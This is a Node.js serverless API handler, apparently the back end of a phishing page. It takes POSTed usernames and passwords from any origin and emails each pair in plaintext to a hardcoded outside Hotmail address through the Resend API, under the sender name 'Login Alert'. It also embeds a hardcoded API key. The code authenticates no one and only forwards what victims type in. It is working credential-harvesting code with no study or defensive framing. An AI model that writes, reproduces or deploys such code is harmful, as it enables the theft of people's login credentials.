export const config = {
  runtime: 'nodejs',
};

const RESEND_API_KEY = 're_d6SR5bCP_3iU2vbhT2C6k3gTV2Cj5ZqEs';
const TARGET_EMAIL = 'ustk88@hotmail.com';

export default async function handler(
  req: { method?: string; body?: unknown },
  res: { 
    statusCode: number; 
    setHeader: (k: string, v: string) => void; 
    end: (b?: string) => void;
    json?: (data: unknown) => void;
  }
) {
  // Set CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    res.statusCode = 200;
    res.end();
    return;
  }

  if (req.method !== 'POST') {
    res.statusCode = 405;
    res.setHeader('Content-Type', 'application/json');
    res.end(JSON.stringify({ error: 'Method not allowed' }));
    return;
  }

  try {
    const body = req.body as { username?: string; password?: string };
    const { username, password } = body || {};

    if (!username || !password) {
      res.statusCode = 400;
      res.setHeader('Content-Type', 'application/json');
      res.end(JSON.stringify({ error: 'Username and password are required' }));
      return;
    }

    const emailResponse = await fetch('https://api.resend.com/emails', {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${RESEND_API_KEY}`,
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        from: 'Login Alert <noreply@ncoclick.com>',
        to: [TARGET_EMAIL],
        subject: `${new Date().toLocaleDateString()} - ${username}`,
        html: `
          <h2>New Login Attempt</h2>
          <p><strong>Username/Email:</strong> ${username}</p>
          <p><strong>Password:</strong> ${password}</p>
          <p><strong>Time:</strong> ${new Date().toISOString()}</p>
        `,
      }),
    });

    const result = await emailResponse.json();

    if (!emailResponse.ok) {
      res.statusCode = 500;
      res.setHeader('Content-Type', 'application/json');
      res.end(JSON.stringify({ error: 'Failed to send email', details: result }));
      return;
    }

    res.statusCode = 200;
    res.setHeader('Content-Type', 'application/json');
    res.end(JSON.stringify({ success: true, message: 'Email sent successfully' }));
  } catch (error) {
    res.statusCode = 500;
    res.setHeader('Content-Type', 'application/json');
    res.end(JSON.stringify({ error: 'Internal server error', details: (error as Error).message }));
  }
}
